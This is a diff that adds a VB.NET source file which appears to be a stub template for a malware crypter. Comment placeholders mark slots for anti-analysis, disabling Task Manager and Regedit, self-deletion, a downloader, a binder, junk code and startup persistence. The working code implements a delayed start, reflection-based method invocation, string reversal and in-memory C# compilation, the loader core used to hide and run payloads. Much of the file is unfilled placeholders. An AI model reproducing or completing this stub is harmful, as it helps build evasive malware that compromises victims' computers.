@@ -1,0 +1,95 @@
+Option Explicit Off
+Option Strict Off
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Text
+Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Windows.Forms
+Imports System.IO
+Imports System.CodeDom.Compiler
+'AssemblyCodes
+Public Class Out
+	'FakeAPI#1
+    'FakeAPI#2
+    'FakeAPI#3
+    'FakeAPI#4
+    'FakeAPI#5
+    'FakeAPI#6
+    'FakeAPI#7
+    'FakeAPI#8
+    'FakeAPI#9
+    'FakeAPI#A
+    'FakeAPI#B
+    Shared Sub Main()
+        Dim R As New Resources.ResourceManager("A", Assembly.GetExecutingAssembly)
+        'MessageB
+        System.Threading.Thread.Sleep(DelayExe * 1000)
+        'CallAntis
+        'LoadMethod
+        'KKK
+        'AStartUpCall
+        'CallWS
+        'TaskManagerK
+        'RegeditK
+        'msconfigK
+        'notepadK
+        'dxdiagK
+        'FolderOpts
+        'meltcall
+        'restart
+        'Downloader
+        'delHALDLL
+        'Binder
+    End Sub
+    'InjectionEncryptionAlgorithm
+    Private Shared Function LoadMethod(ByVal [Class] As String, ByVal Void As String, ByVal file As Assembly, ByVal Parameters As Object()) As Boolean
+        Try
+            Dim u As Assembly = file
+            Dim t As Type = u.[GetType]([Class])
+            If t IsNot Nothing Then
+                Dim m As MethodInfo = t.GetMethod(Void)
+                If m IsNot Nothing Then
+                    Return CBool(m.Invoke(Nothing, Parameters))
+                End If
+            End If
+        Catch ex As Exception
+        End Try
+    End Function
+    'Anti's Sub
+    'FunctionA
+    'Killer Sub
+    'StubStrEncryption
+    'KillerFunction
+    'Websites
+    'TaskmanagerSub
+    'RegeditSub
+    'msconfigSub
+    'notepadSub
+    'dxdiagSub
+    'meltSub
+    'junkFunction
+    'InvokeSub
+    Public Shared Function ReverseString(ByVal s As String) As String
+        Dim arr As Char() = s.ToCharArray()
+        Array.Reverse(arr)
+        Return New String(arr)
+    End Function
+    Public Shared Function CC(ByVal Source As String) As Assembly
+        Dim Parameters As New CompilerParameters()
+        Dim cResults As CompilerResults = Nothing
+        Dim Compiler As CodeDomProvider = CodeDomProvider.CreateProvider("CSharp")
+        Parameters.GenerateExecutable = False
+        Parameters.GenerateInMemory = True
+        Parameters.ReferencedAssemblies.Add("System.dll")
+        Parameters.ReferencedAssemblies.Add("System.Management.dll")
+        Parameters.CompilerOptions = "/platform:x86"
+        Parameters.TreatWarningsAsErrors = False
+        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
+        Return cResults.CompiledAssembly
+    End Function
+    'Add2StartUp
+End Class
+'heavyJunk
